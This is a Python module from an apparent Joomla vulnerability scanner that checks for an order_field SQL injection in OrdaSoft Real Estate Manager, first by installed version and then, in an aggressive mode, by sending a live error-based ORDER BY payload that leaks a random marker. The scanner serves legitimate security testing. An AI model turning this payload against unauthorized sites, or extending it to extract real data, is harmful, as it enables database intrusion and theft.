from __future__ import annotations

import re
import secrets
from typing import Any
from urllib.parse import quote

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-100752"
NAME = "OrdaSoft Real Estate Manager order_field SQL injection"
COMPONENT = "Real Estate Manager"
AFFECTED_RULE = "Real Estate Manager 1.0.0 through 6.7.8; fixed in 6.7.9"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
SHOW_PATH = "/index.php"
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.7.9")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("realestatemanager", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Real Estate Manager was not detected through its manifest or component route.", action="No action is required unless Real Estate Manager is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Real Estate Manager {version}, within the affected range below 6.7.9. Public listing views concatenate order_field into ORDER BY."
        action = "Upgrade Real Estate Manager to 6.7.9 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Real Estate Manager {version}, which validates the order_field column against an allow-list."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Real Estate Manager was detected, but its version could not be determined."
        action = "Determine the installed Real Estate Manager version and upgrade to 6.7.9 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_aggressive_probe(target_url: str, catid: int = 1, timeout: int = 15, proxy: str | None = None) -> Finding:
    """Error-based ORDER BY injection through a public listing task.

    ``order_field`` is concatenated into the ORDER BY clause of
    ``task=showCategory``. The payload uses a duplicate-entry/extractvalue
    error with a random marker. 6.7.9 validates the column name.
    """
    base = normalize_url(target_url)
    marker = f"PROOFCMS100752{secrets.token_hex(5).upper()}"
    payload = (
        "(SELECT 6062 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT CONCAT('"
        f"{marker}"
        "')),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
    )
    url = f"{base}{SHOW_PATH}?option=com_realestatemanager&task=showCategory&catid={catid}&order_field={quote(payload)}&order_direction=asc"
    response = HttpClient(timeout=timeout, proxy=proxy).request(
        url, method="GET", headers={"User-Agent": BROWSER_UA}, timeout=timeout
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The listing request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    body = response.get("body") or ""
    leaked = marker in body and f"~{marker}~" in body
    evidence = {
        "catid": catid,
        "status": response.get("status"),
        "marker": marker,
        "leaked": leaked,
        "sql_error": bool(re.search(r"SQL syntax|Duplicate entry|XPATH syntax error|MariaDB server|MySQL server", body, re.IGNORECASE)),
    }
    if leaked:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{SHOW_PATH}",
            evidence=evidence,
            detail="The public category listing evaluated an error-based ORDER BY payload and returned the random marker, confirming unauthenticated SQL injection.",
            action="Upgrade Real Estate Manager to 6.7.9 or newer.",
        )
    status = "BLOCKED_EXTERNAL" if response.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{SHOW_PATH}",
        evidence=evidence,
        detail="The error-based payload did not return the marker. 6.7.9 validates the column, the category id is absent, or the route is not public.",
        action="Upgrade affected Real Estate Manager versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_realestatemanager"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Real Estate Manager page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The Real Estate Manager page is reachable; the order_field SQL injection payload was not sent in safe mode.", action="Use aggressive mode with a public category id on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 15, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Real Estate Manager was not detected as potentially affected."
            return passive
        catid_value = aggressive_value(aggressive_args, aggressive_command, "catid")
        result = run_aggressive_probe(
            target_url,
            catid=int(catid_value) if catid_value and catid_value.isdigit() else 1,
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (reachability) and aggressive (error-based order_field SQL injection) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "SQL Injection", "module_version": "1.0.0", "last_reviewed": "2026-11-18", "updated": "2026-11-18", "required_detectors": ["realestatemanager"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-100752", "https://pocbit.org/pocs/cve-2026-100752", "https://ordasoft.com/"]}
